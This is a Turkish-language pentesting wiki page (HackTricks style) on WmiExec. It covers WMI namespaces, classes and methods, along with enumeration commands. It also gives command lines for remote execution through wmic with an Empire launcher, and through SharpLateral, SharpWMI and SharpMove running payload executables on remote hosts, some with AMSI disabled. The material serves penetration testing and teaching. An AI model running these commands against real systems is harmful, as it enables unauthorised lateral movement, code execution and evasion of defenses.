# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl Çalıştığı Açıklanıyor

Kullanıcı adı ve parola veya hash bilgileri bilinen host'larda, WMI kullanılarak process'ler açılabilir. Komutlar, Wmiexec tarafından WMI kullanılarak yürütülür ve yarı etkileşimli bir shell deneyimi sağlanır.

**dcomexec.py:** Bu script, farklı DCOM endpoint'lerini kullanarak `wmiexec.py`'ye benzer yarı etkileşimli bir shell sunar. Seçilen `-object` değeri endpoint'i belirler; desteklenen object'ler arasında `MMC20.Application`, `ShellWindows` ve orijinal walkthrough'da vurgulanan Shell Browser Window tekniğini sağlayan `ShellBrowserWindow` bulunur.<sup>[[2]](#references)[[3]](#references)</sup>

## WMI Temelleri

### Namespace

Directory tarzı bir hiyerarşi içinde yapılandırılan WMI'nin en üst düzey container'ı `\root`'tur; bunun altında namespace olarak adlandırılan ek directory'ler düzenlenir.<sup>[[1]](#references)</sup>
Namespace'leri listeleme komutları:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Bir namespace içindeki sınıflar şu kullanılarak listelenebilir:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Sınıflar**

win32_process gibi bir WMI sınıf adını ve sınıfın bulunduğu namespace'i bilmek, herhangi bir WMI işlemi için kritik öneme sahiptir.  
`win32` ile başlayan sınıfları listeleme komutları:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Bir sınıfın çağrılması:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

Çalıştırılabilir bir veya daha fazla WMI class işlevi olan Methods çalıştırılabilir.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

WMI service'inin çalışır durumda olup olmadığını doğrulamak için komutlar:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Sistem ve İşlem Bilgileri

WMI aracılığıyla sistem ve işlem bilgilerini toplama:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Saldırganlar için WMI, sistemler veya domain'ler hakkında hassas verileri enumerate etmek için güçlü bir araçtır.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Uzak bir makinede local admins veya oturum açmış kullanıcılar gibi belirli bilgileri almak için WMI üzerinden dikkatle oluşturulmuş komutlarla sorgulama yapılabilir.

### **Manual Remote WMI Querying**

Uzak bir makinedeki local admins ve oturum açmış kullanıcıları stealthy bir şekilde tespit etmek, belirli WMI sorguları aracılığıyla gerçekleştirilebilir. `wmic`, komutları aynı anda birden fazla node üzerinde yürütmek için bir metin dosyasından okuma işlemini de destekler.<sup>[[1]](#references)</sup>

Empire agent gibi bir process'i WMI üzerinden uzaktan çalıştırmak için aşağıdaki komut yapısı kullanılır. Başarılı yürütme, `"0"` dönüş değeriyle belirtilir:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Bu süreç, WMI'ın uzaktan çalıştırma ve sistem enumeration yeteneğini göstererek hem sistem yönetimi hem de penetration testing için kullanımını vurgular.

## Otomatik Araçlar

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket'ın `wmiexec` aracını** da kullanabilirsiniz.


## References

- [1] [Windows Sistemlerini Ele Geçirmek için Kimlik Bilgilerini Kullanma - Bölüm 3 (WMI ve WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Impacket Tool Kit için Başlangıç Rehberi, Bölüm 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
